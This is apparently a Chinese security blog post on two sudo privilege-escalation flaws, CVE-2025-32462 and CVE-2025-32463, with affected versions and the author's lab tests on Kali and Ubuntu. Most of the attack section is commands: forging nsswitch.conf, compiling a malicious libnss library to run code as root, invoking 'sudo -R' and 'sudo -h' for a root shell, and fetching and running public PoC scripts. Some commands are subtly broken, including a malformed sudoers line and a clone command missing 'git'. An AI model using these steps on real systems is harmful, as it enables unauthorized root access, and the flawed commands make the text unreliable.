#  CVE-2025-32462&CVE-2025-32463  
原创 simeon的文章  小兵搞安全   2025-07-02 11:19  
  
- **CVE-2025-32462（主机规则绕过）**  
-h/--host  
 选项未遵循最小权限原则，在非列表场景（如命令执行）中未验证主机规则边界。当 sudoers  
 文件使用 Host  
 或 Host_Alias  
 配置主机级权限时，攻击者可构造恶意主机名绕过访问控制链  
  
。  
- **CVE-2025-32463（Chroot NSS劫持）**  
  
漏洞根因在于 sudo 1.9.14+  
 将 chroot()  
 路径解析提前至 sudoers  
 规则评估前。攻击者在可控目录内植入伪造的 /etc/nsswitch.conf  
，通过 libnss_*.so  
 加载恶意库实现 root shell  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icCXA7Jkf1VE5r9Cw6DicicRcsZlr7Is9NkdqHaTAeqGnia5JyNRXae2GVrlOE8VqBjCToK86sGial6YlVk1AN1txibQ/640?wx_fmt=png&from=appmsg "")  
### 1.1.1CVE-2025-32462 攻击路径  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icCXA7Jkf1VE5r9Cw6DicicRcsZlr7Is9NkvG4vJnSk6b05ks5GIGTjcAs8gIzNuHyC9Y9d29eqUyCJqkakwujGxQ/640?wx_fmt=png&from=appmsg "")  
  
触发条件：需满足 sudoers 中存在分主机权限规则（常见于LDAP/SSSD统一策略环境  
### 1.1.2受影响的发行版与版本  
<table><tbody><tr style="height: 33px;"><td data-colwidth="127" width="127" style="border: 1px solid #d9d9d9;"><p style="margin: 0;padding: 0;min-height: 24px;text-align: left;"><strong><span style="color: rgb(64, 64, 64);font-size: 16px;"><span leaf="">发行版</span></span></strong></p></td><td data-colwidth="250" width="250" style="border: 1px solid #d9d9d9;"><p style="margin: 0;padding: 0;min-height: 24px;text-align: left;"><strong><span style="color: rgb(64, 64, 64);font-size: 16px;"><span leaf="">受影响版本</span></span></strong></p></td><td data-colwidth="250" width="250" style="border: 1px solid #d9d9d9;"><p style="margin: 0;padding: 0;min-height: 24px;text-align: left;"><strong><span style="color: rgb(64, 64, 64);font-size: 16px;"><span leaf="">修复版本</span></span></strong></p></td></tr><tr style="height: 33px;"><td data-colwidth="127" width="127" style="border: 1px solid #d9d9d9;"><p style="margin: 0;padding: 0;min-height: 24px;"><strong><span style="color: rgb(64, 64, 64);font-size: 16px;"><span leaf="">Ubuntu</span></span></strong></p></td><td data-colwidth="250" width="250" style="border: 1px solid #d9d9d9;"><p style="margin: 0;padding: 0;min-height: 24px;"><span style="color: rgb(64, 64, 64);font-size: 16px;"><span leaf="">20.04+/24.04 LTS</span></span></p></td><td data-colwidth="250" width="250" style="border: 1px solid #d9d9d9;"><p style="margin: 0;padding: 0;min-height: 24px;"><span style="color: rgb(64, 64, 64);font-size: 16px;"><span leaf="">1.9.9-1ubuntu2.5+ (22.04)</span></span><span style="color: rgb(64, 64, 64);background-color: rgb(229, 229, 229);font-size: 12px;"></span></p></td></tr><tr style="height: 33px;"><td data-colwidth="127" width="127" style="border: 1px solid #d9d9d9;"><p style="margin: 0;padding: 0;min-height: 24px;"><strong><span style="color: rgb(64, 64, 64);font-size: 16px;"><span leaf="">Debian</span></span></strong></p></td><td data-colwidth="250" width="250" style="border: 1px solid #d9d9d9;"><p style="margin: 0;padding: 0;min-height: 24px;"><span style="color: rgb(64, 64, 64);font-size: 16px;"><span leaf="">Bookworm </span></span></p></td><td data-colwidth="250" width="250" style="border: 1px solid #d9d9d9;"><p style="margin: 0;padding: 0;min-height: 24px;"><span style="color: rgb(64, 64, 64);font-size: 16px;"><span leaf="">1.9.13p3-1+deb12</span></span></p></td></tr></tbody></table>## 1.2CVE-2025-32463 利用链  
### 1.2.1在用户可写目录创建恶意结构  
  
mkdir ./exploit_root  
  
echo 'passwd: ../tmp/libnss_exploit.so.2' > ./exploit_root/etc/nsswitch.conf  
  
gcc -shared -fPIC -o /tmp/libnss_exploit.so.2 exploit.c # 含setreuid(0,0)构造函数  
### 1.2.2触发漏洞  
  
sudo -R ./exploit_root /bin/true  # 加载恶意库获取root shell  
  
核心缺陷：chroot 环境路径解析与 sudoers 评估时序倒置  
## 1.3 CVE-2025-32462 验证步骤  
  
1.配置漏洞环境（需sudoers含主机规则）  
  
echo 'user1 ALL=(ALL:ALL) Host_Alias=TRUSTED_HOSTS' > /etc/sudoers.d/test  
  
2.执行绕过  
  
sudo -h malicious_hostname /bin/bash  # 获取root shell  
  
CVE-2025-32463 自动化检测  
  
wget   
https://stratascale.com/poc/sudo-chwoot.sh  
  
chmod +x sudo-chwoot.sh  
  
./sudo-chwoot.sh check  
## 1.4实际测试  
### 1.4.1 kali2024版本虚拟机测试  
  
1.查看当前内核版本  
  
uname -ar  
  
cat /proc/version  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icCXA7Jkf1VE5r9Cw6DicicRcsZlr7Is9NkPpAgHCVnuLpw2LCQno0b5M9jyeibS3cVia7aHH2VjutOsxXwia4pIWSEA/640?wx_fmt=png&from=appmsg "")  
  
sudo -V  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icCXA7Jkf1VE5r9Cw6DicicRcsZlr7Is9Nk0dr75Fq0m5FVOE8vGCAfBZvGxrcChJERZnYGqQNnjhES7gEU6iaWicyQ/640?wx_fmt=png&from=appmsg "")  
  
2.下载poc并执行  
  
git clone   
https://github.com/pr0v3rbs/CVE-2025-32463_chwoot.git  
  
cd CVE-2025-32463_chwoot  
  
./sudo-chwoot.sh  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icCXA7Jkf1VE5r9Cw6DicicRcsZlr7Is9Nkel3NyTEMtDIZfFncws1VdWPG9atGUSiaGdOpSaDJAgfBqIg0AUs8p7w/640?wx_fmt=png&from=appmsg "")  
### 1.4.2 kali2025测试失败  
  
1.查看内核版本及sudo版本  
  
cat /proc/version  
  
sudo -V  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icCXA7Jkf1VE5r9Cw6DicicRcsZlr7Is9Nk0Ch1ayu2sT4RqfsKjuYyQwIUCvBavlia5xpJaYibbaNtQh5sSbxaMBwQ/640?wx_fmt=png&from=appmsg "")  
  
2.下载并执行poc  
  
 clone   
https://github.com/pr0v3rbs/CVE-2025-32463_chwoot.git  
  
cd CVE-2025-32463_chwoot  
  
./sudo-chwoot.sh  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icCXA7Jkf1VE5r9Cw6DicicRcsZlr7Is9NkHMzg7HmGgiaBHlPXbg2NibfejKK46INgmicmXrAMhJP0dEiaBCdicw2tn2w/640?wx_fmt=png&from=appmsg "")  
### 1.4.3 ubuntu22版本  
  
1.基本信息  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icCXA7Jkf1VE5r9Cw6DicicRcsZlr7Is9NkjUvT1ILrVOMk3zHdSpEHz9mExa4qRty6HE9iak9VBKmaxsGm8P8maMg/640?wx_fmt=png&from=appmsg "")  
  
2.测试poc  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icCXA7Jkf1VE5r9Cw6DicicRcsZlr7Is9NkteoKzkLibWSoYfO1Z5GWEkbH1Jy3AnBr0ErlKe3ntK49wDc6ft9YibrA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icCXA7Jkf1VE5r9Cw6DicicRcsZlr7Is9NkwUpdjAg1jS69YicKichiatMoiaF60ef5ibicKqD9RccY5icvmEPIpTdOGEicTA/640?wx_fmt=png&from=appmsg "")  
  
当前账号没有R权限，需要在/etc/sudoers  
 有R权限。  
  
john ALL=(ALL) NOPASSWD: /path/to/woot -R  
  
      外面传的很厉害，在kali中测试比较成功，在ubantu2022版本以及真实环境中均未再现。个人感觉有些鸡肋。  
  
  
